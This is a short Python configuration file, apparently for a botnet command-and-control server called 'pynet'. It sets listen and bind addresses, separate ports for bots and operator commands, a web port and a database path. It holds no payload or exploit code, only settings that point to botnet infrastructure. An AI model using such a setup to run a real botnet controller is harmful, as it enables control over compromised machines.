import os

SERVER_IP = '0.0.0.0' # Listens on all interfaces
BIND_IP = '192.168.4.128' # IP for bots and users to connect to (change this)
BOT_PORT = 9099
COMMAND_PORT = 1337
WEB_PORT = 80
DB_URI = 'file:/path/to/pynet.db' # Location of database file, it will be created if it doesn't exist (change this)
PATH = os.path.dirname(__file__)
PUBLIC = os.path.join(PATH, 'public')